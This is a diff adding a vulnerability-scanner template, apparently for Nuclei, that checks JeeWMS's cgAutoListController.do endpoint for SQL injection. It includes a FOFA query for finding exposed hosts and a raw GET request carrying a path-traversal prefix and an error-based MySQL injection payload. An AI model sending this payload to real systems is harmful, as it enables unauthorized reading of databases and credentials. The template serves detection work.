@@ -1,0 +1,29 @@
+id: JeeWMS-cgAutoListController_do-sql
+
+info:
+  name: "JeeWMS cgAutoListController.do 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+      JeeWMS系统cgAutoListController.do接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现数据库敏感信息泄露（如管理员凭证、用户隐私数据），在具备高权限条件下可执行任意命令注入操作，导致服务器控制权丧失。该漏洞允许未经身份验证的远程攻击者通过注入点操控数据库查询逻辑，可能引发数据篡改、横向渗透等严重安全事件。
+  reference:
+  - https://mp.weixin.qq.com/s/a8Efd1O4bHP_52NVZyryAQ
+  tags: JeeWMS
+
+http:
+- raw:
+  - |
+    GET /rest/../cgAutoListController.do?datagrid&configId=1%27+AND+GTID_SUBSET%28CONCAT%280x7178627a71%2C%28SELECT+%28ELT%284503%3D4503%2C1%29%29%29%2C0x717a6a6b71%29%2C4503%29--+wnMN  HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'qxbzq1qzjkq'
+  - type: status
+    status:
+    - 200
